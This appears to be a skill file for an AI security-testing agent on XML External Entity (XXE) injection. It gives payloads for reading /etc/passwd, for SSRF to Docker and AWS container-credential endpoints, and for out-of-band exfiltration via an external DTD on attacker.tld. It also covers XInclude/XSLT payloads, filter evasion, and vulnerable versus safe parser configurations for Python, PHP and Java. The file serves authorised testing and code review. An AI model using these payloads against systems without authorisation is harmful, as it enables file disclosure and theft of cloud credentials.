---
name: xxe
description: XXE testing for external entity injection, file disclosure, and SSRF via XML parsers
---

# XXE

XML External Entity injection is a parser-level weakness that can expose local files, route requests to internal services (SSRF), exhaust resources via entity expansion, and in certain stacks achieve code execution through XInclude, XSLT, or language-specific protocol wrappers. Every XML consumer should be assumed vulnerable until its parser configuration is verified.

## Where to Look

**Capabilities**
- File disclosure: read server files and configuration
- SSRF: reach metadata services, internal admin panels, service ports
- DoS: entity expansion (billion laughs), external resource amplification

**Injection Surfaces**
- REST/SOAP/SAML/XML-RPC, file uploads (SVG, Office)
- PDF generators, build/report pipelines, config importers

**Transclusion**
- XInclude and XSLT `document()` loading external resources

## High-Value Targets

**File Uploads**
- SVG/MathML, Office (docx/xlsx/ods/odt), XML-based archives
- Android/iOS plist, project config imports

**Protocols**
- SOAP/XML-RPC/WebDAV/SAML (ACS endpoints)
- RSS/Atom feeds, server-side renderers and converters

**Hidden Paths**
- Parameters: "xml", "upload", "import", "transform", "xslt", "xsl", "xinclude"
- Processing-instruction headers

## How to Detect

### Direct

- Inline disclosure of entity content in the HTTP response, transformed output, or error pages

### Error-Based

- Coerce parser errors that leak path fragments or file content via interpolated messages

### OAST

- Blind XXE via parameter entities and external DTDs; confirm with DNS/HTTP callbacks
- Encode data into request paths/parameters to exfiltrate small secrets (hostnames, tokens)

### Timing

- Fetch slow or unroutable resources to produce measurable latency differences (connect vs read timeouts)

## Core Payloads

### Local File

```xml
<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<r>&xxe;</r>
```

```xml
<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<r>&xxe;</r>
```

### SSRF

```xml
<!DOCTYPE x [<!ENTITY xxe SYSTEM "http://127.0.0.1:2375/version">]>
<r>&xxe;</r>
```

```xml
<!DOCTYPE x [<!ENTITY xxe SYSTEM "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI">]>
<r>&xxe;</r>
```

### OOB Parameter Entity

```xml
<!DOCTYPE x [<!ENTITY % dtd SYSTEM "http://attacker.tld/evil.dtd"> %dtd;]>
```

evil.dtd:
```xml
<!ENTITY % f SYSTEM "file:///etc/hostname">
<!ENTITY % e "<!ENTITY &#x25; exfil SYSTEM 'http://%f;.attacker.tld/'>">
%e; %exfil;
```

## Vulnerability Patterns

### Parameter Entities

- Use parameter entities in the DTD subset to define secondary entities that exfiltrate content
- Works even when general entities are sanitized in the XML tree

### XInclude

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>
```

Effective where entity resolution is blocked but XInclude remains enabled in the pipeline.

### XSLT Document

XSLT processors can fetch external resources via `document()`:

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:copy-of select="document('file:///etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

Targets: transform endpoints, reporting engines (XSLT/Jasper/FOP), xml-stylesheet PI consumers.

### Protocol Wrappers

- Java: `jar:`, `netdoc:`
- PHP: `php://filter`, `expect://` (when module enabled)
- Gopher: craft raw requests to Redis/FCGI when client allows non-HTTP schemes

## Evasion Patterns

**Encoding Variants**
- UTF-16/UTF-7 declarations, mixed newlines
- CDATA and comments to evade naive filters

**DOCTYPE Variants**
- PUBLIC vs SYSTEM, mixed case `<!DoCtYpE>`
- Internal vs external subsets, multi-DOCTYPE edge handling

**Network Controls**
- If network blocked but filesystem readable, pivot to local file disclosure
- If files blocked but network open, pivot to SSRF/OAST

## Special Contexts

### SOAP

```xml
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <!DOCTYPE d [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <d>&xxe;</d>
  </soap:Body>
</soap:Envelope>
```

### SAML

- Assertions are XML-signed, but upstream XML parsers prior to signature verification may still process entities/XInclude
- Test ACS endpoints with minimal probes

### SVG and Renderers

- Inline SVG and server-side SVG→PNG/PDF renderers process XML
- Attempt local file reads via entities/XInclude

### Office Docs

- OOXML (docx/xlsx/pptx) are ZIPs containing XML
- Insert payloads into document.xml, rels, or drawing XML and repackage

## Analysis Workflow

1. **Inventory consumers** - Endpoints, upload parsers, background jobs, CLI tools, converters, third-party SDKs
2. **Capability probes** - Does parser accept DOCTYPE? Resolve external entities? Allow network access? Support XInclude/XSLT?
3. **Establish oracle** - Error shape, length/ETag diffs, OAST callbacks
4. **Escalate** - Targeted file/SSRF payloads
5. **Validate parity** - Same parser options must hold across REST, SOAP, SAML, file uploads, and background jobs

## Confirming a Finding

1. Provide a minimal payload proving parser capability (DOCTYPE/XInclude/XSLT)
2. Demonstrate controlled access (file path or internal URL) with reproducible evidence
3. Confirm blind channels with OAST and correlate to the triggering request
4. Show cross-channel consistency (e.g., same behavior in upload and SOAP paths)
5. Bound impact: exact files/data reached or internal targets proven

## Common False Alarms

- DOCTYPE accepted but entities not resolved and no transclusion reachable
- Filters or sandboxes that emit entity strings literally (no IO performed)
- Mocks/stubs that simulate success without network/file access
- XML processed only client-side (no server parse)

## Business Risk

- Disclosure of credentials/keys/configs, code, and environment secrets
- Access to cloud metadata/token services and internal admin panels
- Denial of service via entity expansion or slow external resources
- Code execution via XSLT/expect:// in insecure stacks

## Analyst Notes

1. Prefer OAST first; it is the quietest confirmation in production-like paths
2. When content is sanitized, use error-based and length/ETag diffs
3. Probe XInclude/XSLT; they often remain enabled after entity resolution is disabled
4. Aim SSRF at internal well-known ports (kubelet, Docker, Redis, metadata) before public hosts
5. In uploads, repackage OOXML/SVG rather than standalone XML; many apps parse these implicitly
6. Keep payloads minimal; avoid noisy billion-laughs unless specifically testing DoS
7. Test background processors separately; they often use different parser settings
8. Validate parser options in code/config; do not rely on WAFs to block DOCTYPE
9. Combine with path traversal and deserialization where XML touches downstream systems
10. Document exact parser behavior per stack; defenses must match real libraries and flags

## Core Principle

XXE is eliminated by hardening parsers: forbid DOCTYPE, disable external entity resolution, and disable network access for XML processors and transformers across every code path.

## Python/JS/PHP Source Detection Rules

### Python
- **VULN (lxml)**: `lxml.etree.parse(user_xml)` — lxml allows external entities by default
- **VULN (lxml)**: `lxml.etree.fromstring(user_xml)` — same default behavior
- **SAFE (lxml)**:
  ```python
  parser = lxml.etree.XMLParser(resolve_entities=False, no_network=True)
  lxml.etree.parse(source, parser)
  ```
- **VULN (stdlib)**: `xml.etree.ElementTree.parse(user_xml)` — Python stdlib ET is vulnerable to billion laughs; check Python version
- **SAFE (stdlib)**: `defusedxml.ElementTree.parse(user_xml)` — use defusedxml library

### PHP
- **VULN**: `simplexml_load_string($userXml)` — no entity protection
- **VULN**: `$doc = new DOMDocument(); $doc->loadXML($userXml)` — external entities enabled by default
- **VULN**: `libxml_disable_entity_loader(false)` or absent call before SimpleXML/DOMDocument usage
- **SAFE**: `libxml_disable_entity_loader(true)` called before parsing (PHP < 8.0)
- **SAFE**: PHP 8.0+ disables external entity loading by default

## Java XML Parser Detection Rules

### DocumentBuilderFactory — Vulnerable vs Safe Configuration

```java
// VULNERABLE: default DocumentBuilderFactory (external entities enabled)
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(request.getInputStream());
// No protective features set — DOCTYPE and external entities fully enabled

// VULNERABLE: explicit external entity access enabled
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://xml.org/sax/features/external-general-entities", true);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", true);

// SAFE: all protective features set
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

**VULN indicator**: `DocumentBuilderFactory.newInstance()` without any call to `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` parsing user-supplied XML.

### SAXParserFactory — Vulnerable vs Safe

```java
// VULNERABLE: default SAX parser
SAXParserFactory spf = SAXParserFactory.newInstance();
SAXParser sp = spf.newSAXParser();
sp.parse(request.getInputStream(), handler);

// SAFE:
SAXParserFactory spf = SAXParserFactory.newInstance();
spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
```

### XMLInputFactory (StAX) — Vulnerable vs Safe

```java
// VULNERABLE: default StAX factory
XMLInputFactory xif = XMLInputFactory.newInstance();
XMLStreamReader xsr = xif.createXMLStreamReader(request.getInputStream());

// SAFE:
XMLInputFactory xif = XMLInputFactory.newInstance();
xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
xif.setProperty(XMLInputFactory.SUPPORT_DTD, false);
```

### XMLDecoder — Critical: This is Deserialization, NOT XXE

```java
// CRITICAL — NOT XXE, but arbitrary Java method invocation:
// XMLDecoder is a Java object deserialization mechanism, not an XML entity processor.
// Tag as insecure_deserialization, NOT xxe.
XMLDecoder decoder = new XMLDecoder(request.getInputStream());
Object obj = decoder.readObject();   // Tag: insecure_deserialization
```

**Important**: Do NOT tag `XMLDecoder` as XXE. It is a deserialization sink (CWE-502), not an XML entity processor.

### TransformerFactory (XSLT) — Vulnerable vs Safe

```java
// VULNERABLE: XSLT transformation of user-supplied stylesheet
TransformerFactory tf = TransformerFactory.newInstance();
Source xslt = new StreamSource(request.getInputStream());  // user-controlled XSLT
Transformer t = tf.newTransformer(xslt);  // XSLT document() can read files/SSRF

// SAFE: secure processing enabled
TransformerFactory tf = TransformerFactory.newInstance();
tf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");
tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
```

### Java TRUE POSITIVE Rules

- `DocumentBuilderFactory.newInstance()` parsing user-controlled XML with NO `disallow-doctype-decl` feature → **CONFIRM**
- `SAXParserFactory.newInstance()` parsing user input with no external-entity features set → **CONFIRM**
- `XMLInputFactory.newInstance()` with `IS_SUPPORTING_EXTERNAL_ENTITIES` not set to false → **CONFIRM**
- `TransformerFactory.newInstance()` processing user-supplied XSLT without `FEATURE_SECURE_PROCESSING` → **CONFIRM**
- `Validator.validate()` / `SchemaFactory` on user-controlled XML schema → **CONFIRM** (schema can include external entities)
- Controller/module explicitly named `xxe` or handling XML input with SAXParser/DocumentBuilder/Unmarshaller on user-controlled data without entity-disabling features → **CONFIRM**

### Java FALSE POSITIVE Rules

- `DocumentBuilderFactory` with `disallow-doctype-decl=true` → **SAFE** (DTD and entities blocked)
- `XMLConstants.FEATURE_SECURE_PROCESSING = true` set on factory → mitigates most XXE vectors
- XML parsed from server-controlled resources only (classpath, config files) — no user input reaches parser
- `XMLDecoder` — tag as `insecure_deserialization`, not `xxe`
- Do not emit `xxe` for plain XML rendering pages that have no XML parsing path or module intent
